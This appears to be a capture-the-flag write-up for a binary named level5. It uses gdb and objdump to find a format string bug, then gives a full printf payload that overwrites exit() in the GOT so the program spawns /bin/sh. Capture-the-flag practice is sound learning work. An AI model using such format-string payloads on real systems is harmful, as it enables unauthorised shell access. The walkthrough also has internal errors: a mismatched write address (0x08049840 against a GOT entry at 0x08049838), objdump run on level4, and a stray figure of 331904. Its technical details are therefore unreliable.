HOW TO FIND THE FLAG:

First we use gdb => gdb level5

'info functions' => 3 functions main, n, o and use of printf and fgets indicates us maybe a format string vulnerability

'info variables' => global variable m with adress 0x08049854

'disas main' => calls n function

'disas n' => buffer of size 512. call to fgets function call to printf function.

'disas o' => call to system with the value '/bin/sh'

Here we need to redirect the execution flow. We'll use something a tric called Global Offset Table Overwrite.

When the program is executed the GOT is initialized for every external functions. By doing so, the executable will cache the memory adress in the GOT, so it doesn't have to ask the library each time an external function is called.

We will overwrite the adress of exit() in GOT with the adress of o

-Find the adress of o function 

-> gdb level5 info functons -> o 0x080484a4

-Find the adress of exit() in GOT 

-> objdump -R level4 -> 08049838

-Find the offset of our string on the stack

In gdb -> r <<< $(python -c 'print "AAAA" + "%08x." * 10') -> we see it's the 4th parameters on the stack

Herw we will write 080484a4 in two parts, the low order bytes then the high order bytes.


Those bytes should be wrote at 08049838

- Our exploit : \x40\x98\x04\x08\x38\x98\x04\x08%<val1>x%4hn%<val2>x%5hn will look like this

We need to write 0x0804 = 2052 at \x40\x98\x04\x08 -> 2052 - 8 bytes = 2044

We need to write 0x84a4 = 33956 at \x38\x98\x04\x08 => 33956 - 2052 = 331904

So here is the complete exploit :

(python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"'; cat) | ./level5
